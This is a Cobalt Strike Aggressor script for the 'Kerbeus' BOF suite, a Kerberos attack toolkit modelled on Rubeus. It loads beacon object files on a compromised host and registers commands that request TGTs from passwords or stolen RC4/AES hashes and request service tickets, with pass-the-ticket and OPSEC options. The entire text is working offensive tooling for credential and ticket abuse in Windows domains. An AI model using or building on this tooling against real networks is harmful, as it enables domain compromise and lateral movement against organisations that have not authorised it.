#
# Kerbeus BOF Suite - Aggressor Script
# Comprehensive Kerberos attack toolkit for Cobalt Strike
# Based on Rubeus functionality
#

# ============================================================================
# Helper function to execute BOF
# ============================================================================

sub kerbeus_exec {
    local('$bid $bof_name $args $barch $handle $data $packed');
    $bid = $1;
    $bof_name = $2;
    $args = $3;

    $barch = barch($bid);
    $handle = openf(script_resource("bin/" . $bof_name . "." . $barch . ".o"));
    $data = readb($handle, -1);
    closef($handle);

    if (strlen($data) == 0) {
        berror($bid, "Failed to load BOF: " . $bof_name . "." . $barch . ".o");
        return;
    }

    $packed = bof_pack($bid, "z", $args);
    beacon_inline_execute($bid, $data, "go", $packed);
}

# ============================================================================
# TICKET REQUESTS
# ============================================================================

# krb_asktgt - Request a TGT
beacon_command_register(
    "krb_asktgt",
    "Request a Kerberos TGT",

    "Request a Ticket Granting Ticket (TGT) using credentials.\n\n" .
    "Usage:\n" .
    "   krb_asktgt /user:USER /password:PASS [/domain:DOMAIN] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/nopac] [/opsec]\n" .
    "   krb_asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n" .
    "   krb_asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n" .
    "   krb_asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC]\n"
);

alias krb_asktgt {
    local('$bid $args');
    $bid = $1;
    $args = substr($0, 11);
    btask($bid, "Kerbeus: Requesting TGT");
    kerbeus_exec($bid, "krb_asktgt", $args);
}

# krb_asktgs - Request a Service Ticket
beacon_command_register(
    "krb_asktgs",
    "Request a Kerberos service ticket (TGS)",

    "Request a Service Ticket using a TGT.\n\n" .
    "Usage:\n" .
    "   krb_asktgs /service:SPN [/ticket:BASE64] [/domain:DOMAIN] [/dc:DC] [/ptt]\n" .
    "   krb_asktgs /service:SPN1,SPN2 /ticket:BASE64 [/enctype:rc4|aes256]\n" .
    "   krb_asktgs /service:SPN /ticket:BASE64 /u2u [/tgs:BASE64]\n"
);

alias krb_asktgs {
    local('$bid $args');
    $bid = $1;
    $args = substr($0, 11);
    btask($bid, "Kerbeus: Requesting TGS");
    kerbeus_exec($bid, "krb_asktgs", $args);
}

